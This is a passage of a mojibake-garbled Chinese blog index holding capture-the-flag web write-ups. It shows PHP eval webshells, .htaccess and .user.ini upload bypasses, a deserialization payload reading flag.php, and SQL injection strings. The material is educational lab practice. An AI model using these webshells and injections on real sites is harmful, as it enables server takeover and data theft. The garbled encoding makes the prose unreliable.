¹ç›®å½•","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf9","date":"2021-07-19T00:23:46.000Z","path":"2021/07/19/buuctf9/","text":"[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢æ‰“å¼€å®¹å™¨ï¼Œæ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ ä¸€.ç‰›åˆ€å°è¯•å…ˆä¸Šä¼ ä¸€ä¸ªæ™®é€šä¸€å¥è¯æœ¨é©¬webshell.jpgï¼š &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphpï¼Œå‘ç°ä¸Šä¼ å¤±è´¥ ç„¶åæˆ‘å°è¯•äº†phtmlã€php3ç­‰éƒ½ä¸èƒ½ç»•è¿‡ è¯•ç€ç›´æ¥ä¸Šä¼ webshell.jpg çœ‹åˆ°å®ƒæœ‰å›æ˜¾ç»™æˆ‘ä»¬è·¯å¾„ï¼Œå°è¯•ä¸€ä¸‹ä¸Šä¼ .user.iniï¼Œä½†æ˜¯ç”±äºæ— æ³•ç¡®å®šä¸Šä¼ çš„æ–‡ä»¶å¤¹å†…æ˜¯å¦å·²ç»å­˜åœ¨phpåç¼€æ–‡ä»¶ï¼Œæˆ‘çŒœæµ‹å­˜åœ¨index.phpï¼Œä½†æ˜¯å¾ˆå¯æƒœå¤±è´¥äº† äºŒ.å¦è¾Ÿè¹Šå¾„è¿™æ—¶å€™å°±è¦å¤ä¹ ä¸€ä¸ªé…ç½®æ–‡ä»¶**.htaccess** .htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚ æˆ‘ä»¬è¿™é‡Œä¸Šä¼ ä¸€ä¸ª**.htaccess**å†…å®¹ä¸ºï¼š 12345&lt;FilesMatch &quot;webshell.jpg&quot;&gt; &#x2F;&#x2F;è¿™é‡Œçš„æ–‡ä»¶åè¦å’Œä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶åä¸€æ · SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; è¿™æ ·Apacheä¼šå°†æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶ï¼ˆwebshell.jpgï¼‰ä»¥phpæ ¼å¼è§£æ è¿™è¾¹è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼š ä¸Šä¼ .htaccessçš„æ—¶å€™è¦æŠ“åŒ…ä¿®æ”¹ä¿®æ”¹æ–‡ä»¶ç±»å‹ï¼š æœ€åæˆ‘ä»¬ç”¨èšå‰‘è¿æ¥å°±å¥½äº† [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzæ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€æ®µä»£ç  ä¸€.ä»£ç åˆ†æ®µæˆ‘æŠŠè¿™æ®µä»£ç å¤§è‡´åˆ†æˆä¸‰éƒ¨åˆ†ï¼š ç¬¬ä¸€éƒ¨åˆ†äº¤ä»£äº†è¯¥æ–‡ä»¶ä¸‹æ–‡ä»¶åŒ…å«äº†flag.phpæ–‡ä»¶ 123&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__); ç¬¬äºŒéƒ¨åˆ†äº¤ä»£äº†FileHandlerç±»çš„å†…å®¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125; ç¬¬ä¸‰éƒ¨åˆ†äº¤ä»£ä¼ å‚çš„é™åˆ¶ 123456789101112131415function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; äºŒ.ä»£ç å®¡è®¡é€šè¿‡getçš„æ–¹å¼è·å–ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œç„¶ååˆ¤æ–­å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦çš„asciiç éƒ½åœ¨32åˆ°125ä¹‹é—´ï¼Œç¡®ä¿å˜é‡strçš„å€¼æ²¡æœ‰ä¸å¯æ‰“å°çš„å­—ç¬¦ä¸²åï¼Œå†æŠŠstrååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå…ˆæ‰§è¡Œè§£æå‡½æ•°__destruct()ï¼Œå¦‚æœopå¼ºç­‰äºå­—ç¬¦ä¸²2ï¼Œé‚£ä¹ˆopå°±ä¼šè¢«èµ‹å€¼ä¸ºå­—ç¬¦ä¸²1ï¼Œæ¥ç€è°ƒç”¨process()å‡½æ•°ï¼Œå¦‚æœopå¼±ç­‰äº1ï¼Œå°±è°ƒç”¨write()å‡½æ•°ï¼›å¦‚æœopå¼±ç­‰äº2ï¼Œå°±è°ƒç”¨read()å‡½æ•°ã€‚å€¼çš„æ³¨æ„çš„æ˜¯read()å‡½æ•°ä¸­å­˜åœ¨file_get_contents()å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•è°ƒç”¨åˆ°read()å‡½æ•°ã€‚ ä¸‰.è§£é¢˜æ€è·¯ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯è¦æƒ³åŠæ³•è°ƒç”¨åˆ°read()å‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬è¦é¿å…opåœ¨__destruct()å‡½æ•°ä¸­è¢«èµ‹å€¼ä¸º1ã€‚ ç”±äºå¼±ç­‰äºåªåˆ¤æ–­å€¼æ˜¯å¦ç›¸ç­‰ï¼Œè€Œå¼ºç­‰äºä¸ä»…åˆ¤æ–­å€¼æ˜¯å¦ç›¸ç­‰ï¼Œè¿˜å…ˆåˆ¤æ–­ç±»å‹æ˜¯å¦ç›¸ç­‰ã€‚æˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œ__destruct()å‡½æ•°ä¸­æ˜¯opå¼ºç­‰äºå­—ç¬¦ä¸²2ï¼Œé‚£æˆ‘ä»¬åªè¦è®©opç­‰äºæ•°å­—2å°±å¯ä»¥ç»•è¿‡å¼ºç­‰äºçš„é™åˆ¶äº†ã€‚ æœ€åæˆ‘ä»¬å†ç”¨php://filteræ–‡ä»¶è¯»å–æµé…åˆfile_get_contents()å‡½æ•°å°±å¯ä»¥è·å–åˆ°flagå•¦ã€‚ å››.æ„é€ åºåˆ—åŒ–payload123456789101112131415&lt;?phpclass FileHandler &#123; public $op &#x3D; 2; public $filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;; public $content;&#125;$a &#x3D; new FileHandler();$b &#x3D; serialize($a);echo $b;?&gt; ä»£ç æ‰§è¡Œè¾“å‡ºb=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; payload:http://cb84aa4b-0ded-48ad-b2e7-b1cc59cdfdb3.node4.buuoj.cn/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; base64è§£ç å¾—flag","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf8","date":"2021-07-17T06:11:11.000Z","path":"2021/07/17/buuctf8/","text":"[ç½‘é¼æ¯ 2018]Fakebookæ‰“å¼€å®¹å™¨","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf7","date":"2021-07-15T10:19:24.000Z","path":"2021/07/15/buuctf7/","text":"[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLæ‰“å¼€å®¹å™¨ï¼Œå‘ç°è¿™æ˜¯ä¸€é“sqlæ³¨å…¥é¢˜è€Œä¸”æ˜¯ä¹‹å‰çš„ä¸€é“ç»­é¢˜ ä¸€.å‘ç°æ³¨å…¥ç‚¹ï¼šç»è¿‡æµ‹è¯•å‘ç°å®ƒå­˜åœ¨æ³¨å…¥ç‚¹ï¼š&#39;ï¼Œè€Œä¸”æ³¨å…¥çš„ä½ç½®æ˜¯åœ¨å¯†ç æ  äºŒ.æ¢ç´¢æ³¨å…¥æ–¹å¼ï¼šè¿›è¿‡åˆæ­¥çš„æµ‹è¯•æˆ‘å‘ç°è¿‡æ»¤äº†å¾ˆå¤šå…³é”®è¯ï¼ŒåŒ…æ‹¬ï¼šç©ºæ ¼ï¼Œunionï¼Œand(&amp;)ï¼Œor(|)ç­‰ç­‰ ä½†æ˜¯æˆ‘è¿™é‡Œå‘ç°å®ƒæ²¡æœ‰è¿‡æ»¤**å¼‚æˆ–ç¬¦(^)**ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¼‚æˆ–ç¬¦åšè¿æ¥ç¬¦ï¼Œç„¶åæˆ‘ä»¬è¿™è¾¹å¯ä»¥ç”¨æ‹¬å·ä»£æ›¿ç©ºæ ¼ï¼ˆæ³¨æ„è¿™é‡Œçš„æ›¿ä»£ä¸æ˜¯å®Œå…¨æ›¿ä»£çš„æ„æ€ï¼Œæˆ‘æ˜¯æ€ä¹ˆç†è§£çš„ï¼šç”¨æ‹¬å·æŠŠåè¯ç»„æ‹¬èµ·æ¥ä»¥ä»£æ›¿ç©ºæ ¼ï¼Œå› æ­¤è¿™é¢˜å †å æ³¨å…¥è‚¯å®šç”¨ä¸äº†äº†ï¼Œå› ä¸ºshowå’Œdatabasesä¹‹é—´è¦ç”¨ç©ºæ ¼éš”å¼€ã€‚ï¼‰æ‰€ä»¥æ€æ¥æƒ³å»å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè¿™æ ·ä¹Ÿæ— éœ€è€ƒè™‘å¼‚æˆ–åˆ¤æ–­è¯­å¥æˆç«‹çš„æ¡ä»¶ã€‚ ä¸‰.æŠ¥é”™æ³¨å…¥å¼€å§‹ï¼š1.çˆ†åº“11&#39;^extractvalue(1,concat(0x7e,database()))# 2.çˆ†è¡¨11&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))# 3.çˆ†åˆ—11&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))# 4.çˆ†å€¼è¿™è¾¹ç”±äºæŠ¥é”™é•¿åº¦å—é™ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸€ä¸‹flagåº”è¯¥æ˜¯åœ¨passwordé‡Œï¼ŒèŠ‚çœä¸€ä¸‹å›æ˜¾é•¿åº¦ 11&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))# å¯ä»¥çœ‹åˆ°è¿˜å·®ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è¯•è¯•ç”¨left()å’Œright()å»æˆª 11&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))# æœ€åæŠŠflagæ‹¼æ¥ä¸€ä¸‹å¾—ï¼šflag{0b94076f-db77-46e6-9ea3-34468bd544a0} [GXYCTF2019]BabySQliåŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ï¼ŒæŒ‰ç…§æƒ¯ä¾‹å…ˆçœ‹æºç  ä¸€.å‘ç°hintæ–‡ä»¶å‘ç°æœ‰ä¸€ä¸ªsearch.phpçš„æ–‡ä»¶ï¼š åˆšå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºè¿™æ˜¯base64ï¼Œç»“æœè§£ç å®Œæ˜¯ä¹±ç ï¼Œæœç´¢å‘ç°åŸæ¥æ˜¯base32ã€‚ æ³¨æ„base32 å’Œ base64 çš„åŒºåˆ«ï¼šbase32 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œæˆ–è€…åé¢æœ‰ä¸‰ä¸ªç­‰å·ã€‚base64 åªæœ‰å¤§ã€å°å†™å­—æ¯å’Œæ•°å­—ç»„æˆï¼Œåé¢ä¸€èˆ¬æ˜¯ä¸¤ä¸ªç­‰å·ã€‚ é‚£ä¹ˆæˆ‘ä»¬æŠŠè¿™æ®µè¯è§£ç ï¼š å¾—åˆ°ä¸€ä¸²base64ç¼–ç ä¸²ï¼Œå†è§£ç ï¼š å‘ç°å°±æ˜¯ä¸€å¥æ™®é€šçš„sqlè¯­å¥ï¼Œæ³¨å…¥ç‚¹ä¸º&#39; äºŒ.å°è¯•æ³¨å…¥å…ˆè¯•è¯•æœ€å¸¸ç”¨çš„unionè”åˆæ³¨å…¥ username=0&#39; union select 1,2# password=12 å­—æ®µæ•°ä¸ä¸€è‡´ï¼Œusernameæ”¹æˆ0&#39; union select 1,2,3# é‚£ä¹ˆè¯´æ˜userè¡¨å­˜åœ¨ä¸‰ä¸ªåˆ—ï¼ŒæŒ‰ç…§ä¹‹å‰çš„ç»éªŒå°±æ˜¯ï¼šidï¼Œusernameï¼Œpassword ç„¶åæˆ‘æƒ³ç›´æ¥çˆ†åº“ï¼š0&#39; union select 1,2,databases#ä½†æ˜¯è¿™æ ·ä¼šæŠ¥é”™ï¼Œæˆ‘æ”¹æˆ0&#39; union select 1,2,database()#å‘ç°å®ƒè¿‡æ»¤äº†æ‹¬å·ï¼Œç„¶åæˆ‘å°è¯•äº†æŠ¥é”™æ³¨å…¥ï¼Œå †å æ³¨å…¥éƒ½ä¸è¡Œï¼Œç„¶åæˆ‘å°±æœ‰ç‚¹æ‡µäº†ï¼Œçœ‹äº†wpæ‰å‘ç°è‡ªå·±å¿˜è®°äº†unionè”åˆæ³¨å…¥çš„ä¸€ä¸ªç‰¹æ€§ï¼šåœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ä½œä¸ºå•ç‹¬ä¸€è¡Œæ•°æ®å€¼ ä¸¾ä¾‹è¯´æ˜ï¼šå‡è®¾åŸæœ¬userè¡¨ä¸­åªå­˜åœ¨ä¸€è¡Œæ•°æ® æˆ‘ä»¬è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼š0&#39; union select 1,&#39;admin&#39;,md5(123)# åå¯ä»¥çœ‹åˆ°userè¡¨ä¸­å¤šäº†ä¸€è¡Œ è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±æ··æ·†äº†adminè´¦å·çš„å¯†ç ã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ•°æ®åº“ä¼šå…ˆæ£€æµ‹æˆ‘ä»¬çš„usernameæ˜¯å¦å­˜åœ¨ï¼Œç„¶ååˆ¤æ–­ä½ è¾“å…¥çš„å¯†ç çš„md5ç¼–ç å’Œå¯¹åº”ç”¨æˆ·åçš„passwordæ˜¯å¦ä¸€æ ·ã€‚ å› æ­¤æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·åã€‚ ä¸€èˆ¬æ¥è¯´æ•°æ®åº“ä¸­éƒ½ä¼šæœ‰adminè¿™ä¸ªè´¦å·ï¼Œé‚£æˆ‘ä»¬å°±æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ï¼š0&#39; union select &#39;admin&#39;,2,3# è¯´æ˜è¦ä¹ˆä¸åœ¨è¿™ä¸€åˆ—ï¼Œè¦ä¹ˆä¸å­˜åœ¨ï¼Œæ¢ä¸€åˆ—è¯•è¯•ï¼š0&#39; union select 1,&#39;admin&#39;,3# å¯ä»¥çœ‹åˆ°è´¦å·adminæ˜¯å­˜åœ¨çš„ã€‚é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å°±å¯ä»¥æ­£å¼å¼€å§‹æˆ‘ä»¬çš„è”åˆæ³¨å…¥äº† ä¸‰.å¼€å§‹æ³¨å…¥ï¼šæ„é€ payload: username=0â€™ union select 1,â€™adminâ€™,â€™202cb962ac59075b964b07152d234b70â€™# password=123 æ³¨ï¼š202cb962ac59075b964b07152d234b70æ˜¯123çš„MD5ç¼–ç  æ€»ç»“è¿™ä¸¤é“éƒ½æ˜¯SQLæ³¨å…¥çš„é¢˜ï¼Œåšä¸‹æ¥æ„Ÿè§‰å°±æ˜¯è¿™ç§é¢˜æ‰¾å¯¹æ³¨å…¥çš„å§¿åŠ¿å¾ˆé‡è¦","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf6","date":"2021-07-14T09:38:53.000Z","path":"2021/07/14/buuctf6/","text":"[SUCTF 2019]CheckInæ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ çš„é¢˜ï¼Œé‚£ä¹ˆæ ¹æ®æˆ‘ä»¬çš„é‡‘å…¸é…æ–¹ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯ä¸Šä¼ åç¼€ä¸ºgifçš„æœ¨é©¬webshell.gifï¼š 1&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; ç„¶åæŠ“åŒ…æ”¹ä¸ºphpï¼Œ æ— æ•ˆåç¼€ï¼Œè¯´æ˜æœåŠ¡å™¨ç«¯ä¹Ÿæ£€æµ‹äº†æ–‡ä»¶åç¼€ï¼Œç„¶åæˆ‘æ¥ç€è¯•äº†phtmlï¼Œphp3ç­‰å˜å½¢åç¼€éƒ½ä¸èƒ½ç»•è¿‡ï¼Œè€Œä¸”ä»–è¿™é‡Œéƒ½ä¸èƒ½ä¸Šä¼ çš„åŸå› éƒ½æ˜¯åç¼€ä¸åˆæ³•ï¼Œæˆ‘å°±æœ‰ç‚¹éš¾å—äº†ï¼Œçœ‹äº†wpå‘ç°ä¹‹å‰upload-labåˆ·çš„å…³äº.user.iniçš„å†…å®¹éƒ½å¿˜å…‰äº†ã€‚ .user.iniphp.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼šPHP_INI_SYSTEMã€PHP_INI_PERDIRã€PHP_INI_ALLã€PHP_INI_USERã€‚ å®é™…ä¸Šï¼Œé™¤äº†PHP_INI_SYSTEMå’ŒPHP_INI_ALLä»¥å¤–çš„æ¨¡å¼éƒ½æ˜¯å¯ä»¥é€šè¿‡.user.iniæ¥è®¾ç½®çš„ã€‚ ä¸‹é¢è¿™æ®µè¯æ˜¯å…³äºPHPè¯†åˆ«iniæ–‡ä»¶çš„è§„åˆ™ï¼šPHP é™¤äº†æ‰«æä¸» php.ini ä¹‹å¤–ï¼Œè¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ ini æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ php æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[&#39;DOCUMENT_ROOT&#39;] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ php æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚ æˆ‘ä»¬è¿™æ ·ç†è§£è¿™æ®µè¯ï¼šå½“è¢«æ‰§è¡Œçš„ php æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–æ—¶ï¼ŒPHPå…ˆåªä¼šæ‰«æ è¢«æ‰§è¡Œphpæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨iniæ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨çš„è¯ å°±ä¼šæŒ‰ç…§è¿™ä¸ªuser.iniå¯¹è¿™ä¸ªç›®å½•è¿›è¡Œé…ç½®ï¼›ç„¶åPHPå‘ä¸Šä¸€çº§ç›®å½•æ‰«æé‡å¤ä¸Šè¿°æ“ä½œç›´è‡³æ‰«æåˆ°æ ¹ç›®å½•ã€‚é…ç½®æ–‡ä»¶çš„åˆ©ç”¨ï¼šphp.iniä¸­çš„é…ç½®é¡¹ä¸­å¾ˆå¤šæ•æ„Ÿçš„é…ç½®é¡¹ï¼Œéƒ½æ˜¯PHP_INI_SYSTEMæ¨¡å¼çš„ï¼ˆç”šè‡³æ˜¯php.ini onlyçš„ï¼‰ï¼ŒåŒ…æ‹¬disable_functionsã€extension_dirã€enable_dlç­‰ã€‚éƒ½æ˜¯æˆ‘ä»¬è¿˜æ˜¯æ‰¾åˆ°ä¸¤ä¸ªå¯ä»¥ç”¨æ¥åˆ©ç”¨çš„é…ç½®é¡¹ï¼ˆä¸‹å›¾çš„ä¸€å’Œå››ï¼‰ auto_prepend_fileï¼šæŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚ auto_append_fileï¼šä¸auto_prepend_fileé…ç½®é¡¹åŠŸèƒ½ç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š 1auto_prepend_file&#x3D;webshell.gif å› æ­¤æ‡‚å¾—äº†.user.iniçš„åˆ©ç”¨ï¼Œè¿™é¢˜çš„æ€è·¯å°±æ‰“å¼€äº†ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯åˆ©ç”¨çš„å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚å› æ­¤æˆ‘ä»¬å…ˆéªŒè¯ä¸€ä¸‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å¤¹å†…æ˜¯å¦å­˜åœ¨phpæ–‡ä»¶ï¼Œç„¶åæˆ‘ä¸Šä¼ äº†å¾ˆå¤šä¸ªæ–‡ä»¶ å‘ç°ä¸Šä¼ çš„æ–‡ä»¶å¤¹ä¸­å­˜åœ¨index.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒçš„åˆ©ç”¨å•¦ æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªæˆ‘ä»¬çš„.user.ini ï¼Œä½†æ˜¯ä»–è¿™é‡Œå­˜åœ¨æ–‡ä»¶å¤´å†…å®¹æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬åŠ ä¸Šgifæ–‡ä»¶å¤´ä¿®é¥°ï¼š 12GIF89aauto_prepend_file&#x3D;webshell.gif ä¸Šä¼ æˆåŠŸ æ¥ç€ä¸Šä¼ æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬webshell.gifï¼š 12GIF89a&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt; å‘ç°å®ƒè¿‡æ»¤äº†&lt;?ï¼Œå› æ­¤å†å¯¹æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬æ”¹å†™webshell2.gifï¼š 12GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;pass&#39;])&lt;&#x2F;script&gt; ä¸Šä¼ æˆåŠŸ è¿™è¾¹æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯æˆ‘æŠŠä¿®æ”¹åçš„æœ¨é©¬æ”¹åä¸ºäº†webshell2.gifï¼Œæ‰€ä»¥.user.iniå†…å¯¹åº”çš„æ–‡ä»¶åä¹Ÿè¦è¿›è¡Œæ”¹å†™ å…¨éƒ¨ä¸Šä¼ æˆåŠŸä»¥åï¼Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è·å–flagã€‚ ç¬¬ä¸€ç§ç”¨èšå‰‘è¿æ¥ï¼Œå†æ‰“å¼€è™šæ‹Ÿç»ˆç«¯ï¼Œè¾“å…¥æŒ‡ä»¤cat /flag spï¼šè¿™è¾¹è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼ŒæœåŠ¡å™¨ä¼šå®šæœŸåˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ä»¥ç¡®ä¿æœåŠ¡å™¨å®‰å…¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°½å¿«è¿æ¥èšå‰‘ï¼Œå®Œæˆæ“ä½œã€‚ ç¬¬äºŒç§å°±æ˜¯ç›´æ¥ä¼ å‚ï¼Œpostæˆ‘ä»¬å†™çš„ä¸€å¥è¯æœ¨é©¬å¯¹åº”çš„å˜é‡ï¼Œæ‰«ææ ¹ç›®å½•å¹¶ä»¥æ•°ç»„æ–¹å¼å›æ˜¾è¾“å‡ºæ–‡ä»¶å æˆ‘ä»¬çœ‹åˆ°å­˜åœ¨flagæ–‡ä»¶ï¼Œå°è¯•è¯»å–å®ƒï¼š å‚è€ƒèµ„æ–™ï¼šhttps://www.php.net/manual/zh/ini.list.php https://blog.csdn.net/weixin_44077544/article/details/102688564 https://blog.csdn.net/RABCDXB/article/details/113623796","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"æ”»é˜²ä¸–ç•Œwebè¿›é˜¶","date":"2021-07-13T02:46:25.000Z","path":"2021/07/13/æ”»é˜²ä¸–ç•Œwebè¿›é˜¶3/","text":"[ZJCTF 2019]NiZhuanSiWeiæ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€æ®µä»£ç : 12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo 